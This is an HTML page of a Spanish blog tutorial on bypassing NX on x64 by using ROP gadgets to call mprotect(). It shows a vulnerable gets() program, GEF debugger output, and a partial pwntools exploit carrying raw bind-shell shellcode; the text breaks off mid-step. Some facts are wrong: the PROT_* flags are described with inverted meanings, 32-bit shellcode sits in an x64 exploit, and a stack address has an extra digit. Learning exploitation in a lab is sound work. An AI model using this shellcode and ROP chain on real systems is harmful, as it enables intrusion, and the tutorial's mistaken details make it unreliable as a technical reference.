@@ -1,0 +1,1348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Bypass NX usando mprotect() en x64 | c4rta</title>
+<meta name="generator" content="Jekyll v4.3.2">
+<meta property="og:title" content="Bypass NX usando mprotect() en x64">
+<meta name="author" content="c4rta">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como ret2libc, ret2reg, mas que nada tecnicas que usen ROP. Asi que ahora te voy a mostrar como usar mprotect() para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.">
+<meta property="og:description" content="En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como ret2libc, ret2reg, mas que nada tecnicas que usen ROP. Asi que ahora te voy a mostrar como usar mprotect() para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.">
+<link rel="canonical" href="https://ic4rta.github.io//explotacion%20binaria/2023/02/26/bypassNX-mprotect.html">
+<meta property="og:url" content="https://ic4rta.github.io//explotacion%20binaria/2023/02/26/bypassNX-mprotect.html">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-02-26T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="Bypass NX usando mprotect() en x64">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c4rta"},"dateModified":"2023-02-26T00:00:00+00:00","datePublished":"2023-02-26T00:00:00+00:00","description":"En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como ret2libc, ret2reg, mas que nada tecnicas que usen ROP. Asi que ahora te voy a mostrar como usar mprotect() para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.","headline":"Bypass NX usando mprotect() en x64","mainEntityOfPage":{"@type":"WebPage","@id":"https://ic4rta.github.io//explotacion%20binaria/2023/02/26/bypassNX-mprotect.html"},"url":"https://ic4rta.github.io//explotacion%20binaria/2023/02/26/bypassNX-mprotect.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/favicon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script>
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+<link type="application/atom+xml" rel="alternate" href="https://ic4rta.github.io//feed.xml" title="c4rta">
+<script>
+  function initGoogleAnalytics() {
+    var doNotTrack = (window.doNotTrack === "1" || navigator.doNotTrack === "1" ||
+      navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1");
+    var enableDNT = "true" == "true";
+
+    if (!enableDNT || !doNotTrack) {
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-212989441-1', 'auto');
+      ga('send', 'pageview');
+    }
+  }
+  window.addEventListener("load", initGoogleAnalytics);
+</script>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/languages/go.min.js"></script>
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #fff -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #ff4e00 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+
+</head>
+<body>
+
+
+
+
+  
+      <!-- [function][get_value] uppercase -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">    
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="c4rta" src="/favicon.png" onerror="this.style.display='none'">
+  c4rta
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>      
+          <div class="trigger">
+<a class="page-link" href="/">Home</a><a class="page-link" href="/categories.html">Categorias</a><a class="page-link" href="/tags.html">Etiquetas</a><a class="page-link" href="/about.html">Sobre Mi</a><a class="page-link" href="https://github.com/ic4rta" target="_blank"><img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
+            <a class="page-link" href="http://twitter.com/_c4rta_" target="_blank"><img src="https://img.shields.io/badge/Twitter%20-%230077B5.svg?&style=for-the-badge&logo=Twitter&logoColor=white%22" alt="Twitter"></a>
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+</div>
+        </nav>
+</div>
+  </div>
+
+</header>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+<script>
+  function initHeader() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  }
+  document.addEventListener('DOMContentLoaded', initHeader);
+</script>
+
+<!-- 页面菜单栏 注释=固定/不注释=隐藏 -->
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] post-header.html -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] ./assets/images/home/home-t.png -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] #000 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0.618 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 50vh -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] font-size: 2.25em; font-weight: bold;  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] color: gold -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value]  -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] true -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] 0 -->
+  
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  18.4vh;
+      min-height: 50vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 50vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 2.25em; font-weight: bold; 
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(/assets/images/home/home-t.png)"></div>
+        <img class="img-placeholder" src="/assets/images/home/home-t.png">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">Bypass NX usando mprotect() en x64</h1>
+  <h2 class="post-subtitle"></h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2023-02-26T00:00:00+00:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Feb 26, 2023
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+      <!-- [function][get_article_words] 1371 -->
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 8 mins</span>
+  </p>
+<div class="post-tags"><a class="post-tag" href="/tags.html#ROP">#ROP</a></div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+  
+      <!-- [function][get_value] auto -->
+  
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+  
+      <!-- [function][get_value] {"image"=>"./assets/images/home/home-t.png", "opacity"=>0.618, "background"=>"#000", "height"=>"50vh", "min_height"=>"50vh", "heading_style"=>"font-size: 2.25em; font-weight: bold; ", "subheading_style"=>"color: gold"} -->
+  
+
+
+
+
+
+
+  
+      <!-- [function][get_value] [] -->
+  
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <p class="lead">En ocasiones se nos presenta la situacion donde tenemos el NX activado y tenemos que recurrir a tecnicas como <code class="language-plaintext highlighter-rouge">ret2libc</code>, <code class="language-plaintext highlighter-rouge">ret2reg</code>, mas que nada tecnicas que usen <code class="language-plaintext highlighter-rouge">ROP</code>. Asi que ahora te voy a mostrar como usar <code class="language-plaintext highlighter-rouge">mprotect()</code> para volver a marcar el stack como ejecutable y puedas inyectar una shellcode.</p>
+
+<h2 id="mprotect">mprotect()</h2>
+
+<p>Segun la man page de Linux <code class="language-plaintext highlighter-rouge">mprotect</code> es:</p>
+
+<p>mprotect () cambia las protecciones de acceso para las páginas de memoria del proceso de llamada que contienen cualquier parte del rango de direcciones en el intervalo [addr, addr+len-1]. addr debe estar alineado con el límite de la página… En caso de éxito, mprotect () devuelve cero. En caso de error, esta llamada al sistema devuelve -1 y errno para indicar el error. se establece</p>
+
+<p>Y aca mas entendible seria que mprotect es la funcion que establece los permisos de lectura y escritura a cierta area de memoria. Esta funcion toma 3 argumentos:</p>
+
+<ul>
+  <li>Una direccion inicial</li>
+  <li>La longitud, que seria el rango en que podemos modificar</li>
+  <li>Y una combinacion de banderas que son las que haran que se establezcan los permisos, estas banderas son:
+    <ul>
+      <li>
+<strong>PROT_READ</strong>: La memoria no se puede leer</li>
+      <li>
+<strong>PROT_WRITE</strong>: La memoria no se puede modificar/escribir</li>
+      <li>
+<strong>PROT_EXEC</strong>: La memoria no se puede ejecutar o no es ejecutable</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="crafteando-el-exploit">Crafteando el exploit</h2>
+
+<h3 id="codigo-vulnerable">Codigo vulnerable</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+
+    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>No hace falta hacer reversing por que la vulnerabilidad se encuentra en la funcion <code class="language-plaintext highlighter-rouge">gets</code></p>
+
+<p>Como estamos en 64 bits los primero 6 argumentos se pasan los registros RDI, RSI, RDX, RCX, R8 y R9, y cualquier cosa despues se empieza a pasar por el stack.</p>
+
+<p>En x64 para poder hacer esta tecnica ocupados de:</p>
+
+<ul>
+  <li>La direccion base de libc</li>
+  <li>Un gadget <strong>pop rdi</strong>; ret: este funcionara para poner la direccion de la pila en rdi</li>
+  <li>Un gadget <strong>pop rsi</strong>; ret: esta funcionara para poner la longitud en rsi</li>
+  <li>Un gadget <strong>pop rdx</strong>; ret,: este funcionara para establecer el valor 0x7 en rdx, este valor es el de los permisos de lectura, escritura y ejecucion.</li>
+</ul>
+
+<p>Algo asi se llamaria a la funcion mprotect:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#incluye &lt;sys/mman.h&gt; 
+</span>
+       <span class="kt">int</span> <span class="nf">mprotect</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">);</span>
+                            <span class="o">|</span>            <span class="o">|</span>        <span class="o">|</span>
+                            <span class="o">|</span>            <span class="o">|</span>        <span class="o">|</span>
+                           <span class="n">RDI</span>          <span class="n">RSI</span>      <span class="n">RDX</span>
+</code></pre></div></div>
+
+<h3 id="sacando-la-direccion-de-libc">Sacando la direccion de libc</h3>
+
+<p>Dentro del debugger podemos ingresar el comando <code class="language-plaintext highlighter-rouge">vmmap libc</code>, obviamente antes hay que ejecutar el binario. Podemos ver la direccion base de libc:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  vmmap libc
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x007ffff7db6000 0x007ffff7dd8000 0x00000000000000 r-- /usr/lib/libc.so.6
+0x007ffff7dd8000 0x007ffff7f32000 0x00000000022000 r-x /usr/lib/libc.so.6
+0x007ffff7f32000 0x007ffff7f8a000 0x0000000017c000 r-- /usr/lib/libc.so.6
+0x007ffff7f8a000 0x007ffff7f8e000 0x000000001d4000 r-- /usr/lib/libc.so.6
+0x007ffff7f8e000 0x007ffff7f90000 0x000000001d8000 rw- /usr/lib/libc.so.6
+gef➤ 
+</code></pre></div></div>
+<p>La direccion que usare es <code class="language-plaintext highlighter-rouge">0x007ffff7db6000</code></p>
+
+<h3 id="offset-del-rip">Offset del RIP</h3>
+
+<p>Como estamos en x64 podemos hacer uso del offset del RSP o del RBP y sumarle 8.</p>
+
+<p>Como estoy usando GEF, ingresare el comando <code class="language-plaintext highlighter-rouge">pattern create 300</code>, para generar 300 caracteres que le pasaremos como input. Una vez que el programa pete ingresare <code class="language-plaintext highlighter-rouge">pattern offset $rbp</code> para pasar el offset del RBP:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern offset $rbp
+[+] Searching for '$rbp'
+[+] Found at offset 256 (little-endian search) likely
+</code></pre></div></div>
+<p>Ahora le sumamos 8 y nos da 264 que seria el desplazamiento para llegar al RIP.</p>
+
+<p>Hace rato les mencione que mprotect recibia un argumento que es la longitud, debido a que la cadena que le metimos esta desde la direccion <code class="language-plaintext highlighter-rouge">0x007fffffffe418</code>, podemos usar una direccion anterior lo suficientemente grande. Regularmente la longitud que se le pasa a mprotect en estos casos es <code class="language-plaintext highlighter-rouge">0x1000</code>, la cual podra ser desde la direccion <code class="language-plaintext highlighter-rouge">0x7ffffffffe000</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x007fffffffe418│+0x0000: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"	 ← aca estan
+0x007fffffffe420│+0x0008: "jaaaaaabkaaaaaablaaaaaabmaaa"
+0x007fffffffe428│+0x0010: "kaaaaaablaaaaaabmaaa"
+0x007fffffffe430│+0x0018: "laaaaaabmaaa"
+0x007fffffffe438│+0x0020: 0x007f006161616d ("maaa"?)
+0x007fffffffe440│+0x0028: 0x007fffffffe528  →  0x007fffffffe89f  →  "/home/c4rta/Downloads/mprotect"
+0x007fffffffe448│+0x0030: 0xc91dfa2faf99b844
+0x007fffffffe450│+0x0038: 0x0000000000000000
+────────────────────────────────────────────
+</code></pre></div></div>
+
+<p>Hasta ahora nuestro exploit va asi:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./mprotect</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">n/sh</span><span class="se">\x68</span><span class="s">//bi</span><span class="se">\x89\xe3\x51\x53\x89\xe1\xb0\x0b</span><span class="sh">"</span>
+<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xcd\x80</span><span class="sh">"</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x007ffff7db6000</span>
+<span class="n">rip_offset</span> <span class="o">=</span> <span class="mi">264</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="mh">0x7ffffffffe000</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
+</code></pre></div></div>
+
+<h3 id="direccion-de-mprotect">Direccion de mprotect</h3>
+
+<p>Dentro de gdb podemos usar <code class="language-plaintext highlighter-rouge">p mprotect</code> y nos da esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p mprotect
